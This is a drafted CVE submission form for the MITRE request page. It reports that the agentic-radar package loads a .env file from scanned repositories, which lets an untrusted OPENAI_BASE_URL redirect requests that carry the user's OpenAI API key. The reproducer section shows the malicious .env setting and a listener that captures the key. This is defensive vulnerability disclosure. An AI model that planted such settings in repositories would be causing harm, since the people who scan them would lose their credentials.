# MITRE cveform submission — field by field

Submit at `https://cveform.mitre.org/`, request type **Create a CVE ID**. Use the text below
verbatim; it is written for a reviewer who has not seen the case.

## Product

```
agentic-radar (PyPI package)
```

## Vendor

```
SplxAI — https://github.com/splx-ai/agentic-radar
Contact attempted: developers@splx.ai, ante@splx.ai
```

## Version

```
>=0.9.1, <=0.14.1 (0.9.1 is the first release containing both the import-time load_dotenv()
call and the openai-agents analyzer LLM call; 0.14.1 is the latest release at time of report)
```

## Vulnerability type

```
CWE-15: External Control of System or Configuration Setting
Secondary: CWE-522: Insufficiently Protected Credentials
```

## Description

```
agentic-radar loads environment variables with python-dotenv at import time
(agentic_radar/cli.py, load_dotenv()). The default dotenv search begins at the installed
package directory and walks up the tree, so a .env file placed in or above site-packages is
loaded. When the package is installed inside an untrusted repository — the in-tree virtualenv
layout used by the project's own GitHub Actions example — a .env committed to that repository
is read.

The tool does not validate OPENAI_BASE_URL and uses it as the API base for the OpenAI client.
During `agentic-radar scan openai-agents` it sends chat.completions requests unconditionally,
with the operator's OPENAI_API_KEY in an Authorization: Bearer header. A repository author can
set OPENAI_BASE_URL to a host they control and receive the key.

Reproduced on 0.14.1: two POST /v1/chat/completions requests carrying the key reached a local
listener and the scan exited 0. A control run with the package installed in a standalone
virtualenv outside the repository produced zero requests.
```

## Impact

```
Disclosure of the user's OpenAI API key to the author of the repository being scanned.
The key is billable and typically grants access to other resources in the same account.
Severity: High (CVSS 3.1 7.4, AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N). A CNA may reasonably
re-score with S:U as 6.5 (Medium).
```

## References

```
https://github.com/splx-ai/agentic-radar
https://pypi.org/project/agentic-radar/
No GitHub advisory possible: private vulnerability reporting is disabled on the repository.
Reporter bundle: https://github.com/Teycir/agentic-radar-cve (private)
```

## PoC / reproducer

```
1. Create a repository containing a .env with:
   OPENAI_BASE_URL=http://127.0.0.1:8899/v1
2. Create a virtualenv inside that repository and install agentic-radar==0.14.1.
3. Start the listener (pocs/exfil_listener.py, attached) on 127.0.0.1:8899.
4. Export a dummy OPENAI_API_KEY and run: .venv/bin/agentic-radar scan openai-agents
5. Observe POST /v1/chat/completions with Authorization: Bearer <key> in listener output.
```

## Vendor contact

```
No private reporting channel exists: private vulnerability reporting is disabled on the
repository (no Security tab, security/advisories/new unavailable) and there is no SECURITY.md.
Email to developers@splx.ai (Cc ante@splx.ai) sent 2026-11-12 with a 10-business-day deadline.
<insert: no reply / reply text>.
developers@splx.ai is the address published in PyPI metadata and CODE_OF_CONDUCT.md.
```

## Disclosure timeline

```
2026-11-11  vulnerability reproduced and documented
2026-11-12  vendor notified (advisory + email), 10-business-day deadline stated
<date>      deadline passed with no vendor response
<date>      this submission
```

## Notes for the reviewer

```
The project appears unmaintained in the security sense: no SECURITY.md, no private reporting
channel, and no release since 2025-11-27. The maintainer is unresponsive, so assignment as
CNA of last resort is requested rather than further coordination.
```

## After submitting

- Save the confirmation page and the tracking number.
- Expect an automated acknowledgement, then silence for weeks. Follow up once after 14 days
  with the same tracking number — do not open a second request.
- A CVE ID usually arrives before the public record is published.
